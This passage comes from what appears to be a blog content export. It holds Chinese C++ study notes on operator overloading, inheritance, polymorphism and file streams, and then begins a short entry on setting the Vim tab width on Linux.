<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//将年龄数据开辟到堆区</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(age);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重载赋值运算符 </span></span><br><span class="line">	Person&amp; <span class="keyword">operator</span>=(Person &amp;p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//编译器提供的代码是浅拷贝</span></span><br><span class="line">		<span class="comment">//m_Age = p.m_Age;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//提供深拷贝 解决浅拷贝的问题</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_Age);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//返回自身</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//年龄的指针</span></span><br><span class="line">	<span class="type">int</span> *m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>调用方法</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">p3</span><span class="params">(<span class="number">30</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">p3 = p2 = p1; <span class="comment">//赋值操作，链式编程</span></span><br></pre></td></tr></table></figure></div>

<h4 id="4-4-5-关系运算符重载"><a href="#4-4-5-关系运算符重载" class="headerlink" title="4.4.5 关系运算符重载"></a>4.4.5 关系运算符重载</h4><p><strong>使用情形：</strong>当两个类对象需要进行比较运算的时候，需要重载关系运算符，才能实现对象直接的比较</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>==(Person &amp; p)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="4-4-6-函数调用运算符重载"><a href="#4-4-6-函数调用运算符重载" class="headerlink" title="4.4.6 函数调用运算符重载"></a>4.4.6 函数调用运算符重载</h4><ul>
<li>函数调用运算符 ()  也可以重载</li>
<li>由于重载后使用的方式非常像函数的调用，因此称为<strong>仿函数</strong></li>
<li>仿函数没有固定写法，非常灵活</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdd</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 + v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>调用方式</strong></p>
<p>对于仿函数的调用可以先定义一个类对象，传入参数并输出给变量实现仿函数调用</p>
<p>也可以通过匿名对象（直接调用类名而不额外定义对象）调用来实现仿函数调用</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyAdd add;</span><br><span class="line">	<span class="type">int</span> ret = <span class="built_in">add</span>(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; ret &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//匿名对象调用  </span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;MyAdd()(100,100) = &quot;</span> &lt;&lt; <span class="built_in">MyAdd</span>()(<span class="number">100</span>, <span class="number">100</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：仿函数就是在类中重载了（）符号，其实施效果与函数类似，所以叫仿函数</p>
</blockquote>
<h3 id="4-5-继承"><a href="#4-5-继承" class="headerlink" title="4.5 继承"></a>4.5 继承</h3><h4 id="4-5-1-继承的概念"><a href="#4-5-1-继承的概念" class="headerlink" title="4.5.1 继承的概念"></a>4.5.1 继承的概念</h4><p><strong>概念：</strong>根据特征相同的共性，进行父子继承，<strong>减少重复代码</strong></p>
<p><strong>实现方式：</strong><code>class A : public B;</code> ，即A继承B</p>
<ul>
<li><p>A 类称为子类 或 派生类</p>
</li>
<li><p>B 类称为父类 或 基类</p>
</li>
</ul>
<p><strong>继承的内存管理：</strong>子类继承父类所有的属性&#x2F;方法，只是无法访问权限不够仅此而已</p>
<h4 id="4-5-2-继承语法"><a href="#4-5-2-继承语法" class="headerlink" title="4.5.2 继承语法"></a>4.5.2 继承语法</h4><p>继承的语法：<code>class 子类 : 继承方式  父类 &#123;&#125;</code></p>
<p><strong>继承方式一共有三种：</strong></p>
<ul>
<li><p>公共继承</p>
<p><code>class 子类 : public  父类 &#123;&#125;</code></p>
<p>能访问<code>public</code>与<code>protected</code>，且权限不变</p>
</li>
<li><p>保护继承</p>
<p><code>class 子类 : protected 父类 &#123;&#125;</code></p>
<p>能访问<code>public</code>与<code>protected</code>，但所有能访问的，权限都继承为<code>protected</code></p>
</li>
<li><p>私有继承</p>
<p><code>class 子类 : private 父类 &#123;&#125;</code></p>
<p>能访问<code>public</code>与<code>protected</code>，但所有能访问的，权限都继承为<code>private</code></p>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/clip_image002.png"
                      alt="img"
                ></p>
<blockquote>
<p>总结：继承后儿子类可以访问父亲类中<code>public</code>与<code>protected</code>的属性&#x2F;方法，并且继承对应继承方法的权限，但是父类的private不能通过继承访问（友元可以）</p>
</blockquote>
<h4 id="4-5-3-继承对象模型布局"><a href="#4-5-3-继承对象模型布局" class="headerlink" title="4.5.3 继承对象模型布局"></a>4.5.3 继承对象模型布局</h4><p>利用工具<code>开发人员命令提示</code>工具查看对象模型</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241025022704853.png"
                      alt="image-20241025022704853"
                ></p>
<p>打开窗口并定位到当前cpp文件目录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241025022743440.png"
                      alt="image-20241025022743440"
                ></p>
<p>定位到后，输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cl /d1 reportSingleClassLayout</span><br></pre></td></tr></table></figure></div>

<p>查看的类名   所属文件名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/1545882158050.png"
                      alt="1545882158050"
                ></p>
<h4 id="4-5-4-继承中的函数与成员"><a href="#4-5-4-继承中的函数与成员" class="headerlink" title="4.5.4 继承中的函数与成员"></a>4.5.4 继承中的函数与成员</h4><h5 id="4-5-4-1-构造和析构顺序"><a href="#4-5-4-1-构造和析构顺序" class="headerlink" title="4.5.4.1 构造和析构顺序"></a>4.5.4.1 构造和析构顺序</h5><p>继承中先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p>
<p>其实就是与类对象作为类成员时调用的先后一样，具体可以回去看[这里](#4.2.3.1 类对象作为类成员)</p>
<p><strong>函数调用顺序</strong></p>
<p><strong>构造函数：</strong>先调用继承中父类的构造，再调用本类构造</p>
<p><strong>析构函数：</strong>先调用本类的析构，再调用继承中父类的析构</p>
<blockquote>
<p>总结：现有继承中父类，所以先调用继承中父类的构造，销毁时先销毁本类调用本类的析构，而继承中父类不一定立刻就被销毁，所以后调用析构</p>
</blockquote>
<h5 id="4-5-4-2-同名处理方式"><a href="#4-5-4-2-同名处理方式" class="headerlink" title="4.5.4.2 同名处理方式"></a>4.5.4.2 同名处理方式</h5><p><strong>成员属性（包含静态的情况）</strong></p>
<p>当父类与子类中有相同名字的成员属性，就需要特殊手法进行不同的访问</p>
<p><strong>在全局区或者其他非本类区：</strong></p>
<ul>
<li><p>访问子类同名成员属性   直接访问即可（默认访问子类）</p>
</li>
<li><p>访问父类同名成员属性   需要加作用域（<code>类对象.父类::同名成员属性</code>）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Base下的m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; endl;<span class="comment">//通过对象访问</span></span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; Son::m_A &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; Son::Base::m_A &lt;&lt; endl;<span class="comment">//通过类名访问</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>成员函数（包含静态的情况）</strong></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>这里没有考虑传入的参数是父类对象，当考虑时就是动态多态的内容了，这里先不展开</p>

  </div>

<p>当父类与子类中有相同名字的成员函数，就需要特殊手法进行不同的访问	</p>
<p><strong>在全局区或者其他非本类区：</strong></p>
<ul>
<li><p>访问子类同名成员函数   直接访问即可（默认访问子类）</p>
</li>
<li><p>访问父类同名成员函数   需要加作用域（<code>类对象.父类::同名成员函数</code>）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">s.<span class="built_in">func</span>();</span><br><span class="line">s.Base::<span class="built_in">func</span>();<span class="comment">//通过对象访问</span></span><br><span class="line"></span><br><span class="line">Son::<span class="built_in">func</span>();</span><br><span class="line">Son::Base::<span class="built_in">func</span>();<span class="comment">//通过类名访问</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>特殊情况</strong></p>
<p>如果子类中出现同名，<strong>子类会隐藏掉父类中所有同名成员函数</strong>即使重载全部失效，只要访问父类就必须要加作用域访问</p>
<blockquote>
<p>这种情况是以为父类中重载了就可以直接访问了，实则不然，需要加作用域访问</p>
</blockquote>
<h4 id="4-5-6-多继承"><a href="#4-5-6-多继承" class="headerlink" title="4.5.6 多继承"></a>4.5.6 多继承</h4><p><strong>语法：</strong><code> class 子类 ：继承方式 父类1， 继承方式 父类2  &#123;&#125;...</code></p>
<p><strong>注意事项：</strong>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p>
<blockquote>
<p><strong>C++实际开发中不建议用多继承</strong></p>
</blockquote>
<h4 id="4-5-7-菱形继承"><a href="#4-5-7-菱形继承" class="headerlink" title="4.5.7 菱形继承"></a>4.5.7 菱形继承</h4><p><strong>菱形继承概念：</strong></p>
<p>​	两个派生类继承同一个基类</p>
<p>​	又有某个类同时继承者两个派生类</p>
<p>​	这种继承被称为菱形继承，或者钻石继承</p>
<p><strong>菱形继承如图所示：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241025025624258.png"
                      alt="image-20241025025624258"
                ></p>
<p><strong>缺陷：</strong></p>
<p>菱形继承带来的主要问题是子类继承两份相同的数据，导致资源浪费以及毫无意义</p>
<p><strong>解决方法：</strong></p>
<p>利用虚继承可以解决菱形继承问题</p>
<p>继承前加<code>virtual</code>关键字后，变为虚继承</p>
<p>虚继承会给相同的属性&#x2F;方法一个虚拟的指针，存储了偏移量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241025030613388.png"
                      alt="image-20241025030613388"
                ></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//继承前加virtual关键字后，变为虚继承</span></span><br><span class="line"><span class="comment">//此时公共的父类Animal称为虚基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sheep</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tuo</span>   : <span class="keyword">virtual</span> <span class="keyword">public</span> Animal &#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SheepTuo</span> : <span class="keyword">public</span> Sheep, <span class="keyword">public</span> Tuo &#123;&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="4-6-多态"><a href="#4-6-多态" class="headerlink" title="4.6 多态"></a>4.6 多态</h3><p><strong>概念：</strong>一个属性&#x2F;方法&#x2F;类可以有多个形态，一般通过重载实现多态静态多态，通过派生类和虚函数实现运行时的动态多态</p>
<h4 id="4-6-1-多态分类"><a href="#4-6-1-多态分类" class="headerlink" title="4.6.1 多态分类"></a>4.6.1 多态分类</h4><p><strong>多态分为两类：</strong></p>
<ul>
<li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li>
<li>动态多态: 派生类和虚函数实现运行时多态</li>
</ul>
<p><strong>静态多态和动态多态区别：</strong></p>
<ul>
<li>静态多态的函数地址<strong>早绑定</strong>  -  <strong>编译阶段</strong>确定函数地址</li>
<li>动态多态的函数地址<strong>晚绑定</strong>  -  <strong>运行阶段</strong>确定函数地址</li>
</ul>
<h4 id="4-6-2-静态多态"><a href="#4-6-2-静态多态" class="headerlink" title="4.6.2 静态多态"></a>4.6.2 静态多态</h4><p>静态多态的函数地址<strong>早绑定</strong>  -  <strong>编译阶段</strong>确定函数地址</p>
<p><strong>实现方式：</strong>运用<code>重载</code>实现静态多态</p>
<p>[函数重载](#3.2 函数重载)</p>
<p>[运算符重载](#4.4 运算符重载)</p>
<blockquote>
<p>总结：在程序运行之前就做好了多个形态的准备，能以不同的方式访问不同的形态</p>
</blockquote>
<h4 id="4-6-3-动态多态"><a href="#4-6-3-动态多态" class="headerlink" title="4.6.3 动态多态"></a>4.6.3 动态多态</h4><h5 id="4-6-3-1-基本概念"><a href="#4-6-3-1-基本概念" class="headerlink" title="4.6.3.1 基本概念"></a>4.6.3.1 基本概念</h5><p>动态多态的函数地址<strong>晚绑定</strong>  -  <strong>运行阶段</strong>确定函数地址</p>
<p><strong>实现方式：</strong>运用<code>重写</code>与<code>虚函数</code>实现动态多态</p>
<blockquote>
<p>重写：需要函数名与参数列表个数类型完全相同</p>
<p>虚函数：利用关键字virtual，对父类中的函数进行虚化，使其在运行阶段通过判断传入的参数的类型，找到对应重写的函数并执行</p>
</blockquote>
<p><strong>使用条件：</strong>在写函数时，形参需引用父类对象，在函数中调用父类中的虚函数，实现通过判断传入的参数的类型，找到对应重写的函数并执行（父类指针或引用指向子类对象）</p>
<p><strong>满足条件：</strong>（满足后才能用动态多态）</p>
<ul>
<li>有继承关系</li>
<li>子类重写父类中的虚函数</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//Speak函数就是虚函数</span></span><br><span class="line">	<span class="comment">//函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。</span></span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;动物在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> :<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;小猫在说话&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DoSpeak</span><span class="params">(Animal &amp; animal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	animal.<span class="built_in">speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Cat cat;</span><br><span class="line">	<span class="built_in">DoSpeak</span>(cat);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="4-6-3-2-纯虚函数与抽象类"><a href="#4-6-3-2-纯虚函数与抽象类" class="headerlink" title="4.6.3.2 纯虚函数与抽象类"></a>4.6.3.2 纯虚函数与抽象类</h5><h6 id="4-6-3-2-1-纯虚函数"><a href="#4-6-3-2-1-纯虚函数" class="headerlink" title="4.6.3.2.1 纯虚函数"></a>4.6.3.2.1 纯虚函数</h6><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容，所以这种虚函数就叫做<strong>纯虚函数</strong>（正常的虚函数是帮助遇到菱形继承防止子类继承两份相同的数据，导致资源浪费以及毫无意义）</p>
<p><strong>语法：</strong></p>
<p>virtual 返回值类型 函数名 （参数列表）&#x3D; 0 ;</p>
<h6 id="4-6-3-2-2-抽象类"><a href="#4-6-3-2-2-抽象类" class="headerlink" title="4.6.3.2.2 抽象类"></a>4.6.3.2.2 抽象类</h6><p>当当类中有了纯虚函数，这个类也称为<strong>抽象类</strong></p>
<p><strong>抽象类特点</strong>：</p>
<ul>
<li>无法实例化对象</li>
<li>子类必须重写抽象类中的纯虚函数，否则也属于抽象</li>
</ul>
<h5 id="4-6-3-3-虚析构和纯虚析构"><a href="#4-6-3-3-虚析构和纯虚析构" class="headerlink" title="4.6.3.3 虚析构和纯虚析构"></a>4.6.3.3 虚析构和纯虚析构</h5><p><strong>应用场景：</strong>如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p>
<p>虚析构和纯虚析构共性：（继承的时候，子类复写时可以不加<code>virtual</code>，但最好加，也是提醒自己，这是一个虚函数）</p>
<ul>
<li>可以解决父类指针释放子类对象</li>
<li>都需要有具体的函数实现</li>
</ul>
<p>虚析构和纯虚析构区别：</p>
<ul>
<li>如果是纯虚析构，该类属于抽象类，无法实例化对象</li>
</ul>
<ul>
<li>二者只能同时存在一个</li>
</ul>
<p><strong>虚析构语法：</strong></p>
<p><code>virtual ~类名()&#123;&#125;</code></p>
<p><strong>纯虚析构语法：</strong></p>
<p><code> virtual ~类名() = 0;</code></p>
<p><code>类名::~类名()&#123;&#125;</code></p>
<h3 id="4-7-面向对象三大特征总结"><a href="#4-7-面向对象三大特征总结" class="headerlink" title="4.7 面向对象三大特征总结"></a>4.7 面向对象三大特征总结</h3><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装的意义：</p>
<ul>
<li>将属性和行为作为一个整体，表现生活中的事物</li>
<li>将属性和行为加以权限控制</li>
</ul>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p><strong>继承的意义：</strong></p>
<ul>
<li>根据特征相同的共性，进行父子继承，<strong>减少重复代码</strong></li>
</ul>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p><strong>多态的意义：</strong></p>
<ul>
<li>使一个函数或者属性或者类得到多次的使用</li>
<li>使对应调用的子类对象被调用为父类指针，实现继承后依旧能实现子类对象函数</li>
</ul>
<h2 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5 文件操作"></a>5 文件操作</h2><p><strong>C++中对文件操作需要包含头文件<code>&lt;fstream&gt;</code></strong></p>
<h3 id="5-1-文件操作分类"><a href="#5-1-文件操作分类" class="headerlink" title="5.1 文件操作分类"></a>5.1 文件操作分类</h3><p><strong>操作文件</strong>的三大类:</p>
<ol>
<li>ofstream：写操作</li>
<li>ifstream： 读操作</li>
<li>fstream ： 读写操作（通用）</li>
</ol>
<h3 id="5-2-文件打开方式"><a href="#5-2-文件打开方式" class="headerlink" title="5.2 文件打开方式"></a>5.2 文件打开方式</h3><table>
<thead>
<tr>
<th>打开方式</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>ios::in</td>
<td>为读文件而打开文件</td>
</tr>
<tr>
<td>ios::out</td>
<td>为写文件而打开文件</td>
</tr>
<tr>
<td>ios::ate</td>
<td>初始位置：文件尾</td>
</tr>
<tr>
<td>ios::app</td>
<td>追加方式写文件</td>
</tr>
<tr>
<td>ios::trunc</td>
<td>如果文件存在先删除，再创建</td>
</tr>
<tr>
<td><strong>ios::binary</strong></td>
<td><strong>二进制方式</strong></td>
</tr>
</tbody></table>
<p><strong>注意：</strong> 文件打开方式可以配合使用，利用|操作符</p>
<p><strong>例如：</strong>用二进制方式写文件 <code>ios::binary |  ios:: out</code></p>
<h3 id="5-3-文件操作步骤"><a href="#5-3-文件操作步骤" class="headerlink" title="5.3 文件操作步骤"></a>5.3 文件操作步骤</h3><ol>
<li><p>包含头文件   </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span><span class="comment">//只要涉及到文件就必须有这一步</span></span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>创建流对象  </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">ofstream ofs;<span class="comment">//这是写操作对象</span></span><br><span class="line">ifstream ifs;<span class="comment">//这是读操作对象</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>打开文件</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">ofs.<span class="built_in">open</span>(<span class="string">&quot;文件路径&quot;</span>,打开方式);</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试文件是否顺利打开</span></span><br><span class="line"><span class="keyword">if</span> (!ofs.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>操作数据</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通文本写入操作</span></span><br><span class="line">ofs &lt;&lt; <span class="string">&quot;写入的数据&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//二进制文件写入操作</span></span><br><span class="line">ofs.<span class="built_in">write</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"><span class="comment">//函数原型 ：ostream&amp; write(const char * buffer,int len);</span></span><br><span class="line"><span class="comment">//参数解释：字符指针buffer指向内存中一段存储空间，len是读写的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//二进制文件读取操作</span></span><br><span class="line">ifs.<span class="built_in">read</span>((<span class="type">char</span> *)&amp;p, <span class="built_in">sizeof</span>(p));</span><br><span class="line"><span class="comment">//函数原型：istream&amp; read(char *buffer,int len);</span></span><br><span class="line"><span class="comment">//参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//普通文本文件读取操作</span></span><br><span class="line"><span class="comment">//第一种方式</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (ifs &gt;&gt; buf)</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (ifs.<span class="built_in">getline</span>(buf,<span class="built_in">sizeof</span>(buf)))</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种</span></span><br><span class="line">string buf;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">getline</span>(ifs, buf))</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; buf &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第四种</span></span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">while</span> ((c = ifs.<span class="built_in">get</span>()) != EOF)</span><br><span class="line">&#123;</span><br><span class="line">	cout &lt;&lt; c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>关闭文件</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">ofs.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h2 id="核心编程部分引入"><a href="#核心编程部分引入" class="headerlink" title="核心编程部分引入"></a>核心编程部分引入</h2><p>这里是<strong>黑马程序员</strong>的免费资料，本人从网盘中下载下来了，要学习完整C++基础资料的可以访问下面链接，链接为我的博客（搬运过来了），里面有C++基础资料的网盘分享，需要源文件的朋友可以去下载（在文末）</p>
<a href="/2024/10/22/C++/C++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/" title="C++核心编程">C++核心编程</a>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>data</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统Tab键相关设置</title>
    <url>/2024/09/13/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/centos-linux/Tab%E9%94%AE%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="Tab键相关设置"><a href="#Tab键相关设置" class="headerlink" title="Tab键相关设置"></a>Tab键相关设置</h3><h4 id="修改Tab键一次为4个空格"><a href="#修改Tab键一次为4个空格" class="headerlink" title="修改Tab键一次为4个空格"></a>修改Tab键一次为4个空格</h4><h5 id="1-仅本次"><a href="#1-仅本次" class="headerlink" title="1.仅本次"></a>1.仅本次</h5><p><strong>只在本次开打vim编辑器时生效，若重新打开vim编辑器，则失效</strong></p>
<p>进入末行模式（ESC）<br>输入指令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> tabstop=4</span><br></pre></td></tr></table></figure></div>

<h5 id="2-永久"><a href="#2-永久" class="headerlink" title="2.永久"></a>2.永久</h5><p><strong>要想每次打开vim编辑器都能生效</strong>，可以编辑 Vim 的配置文件 .vimrc，并添加配置来设置 Tab 键的宽度</p>
<p>打开.vimrc文件,若没有就手动创建一个即可</p>
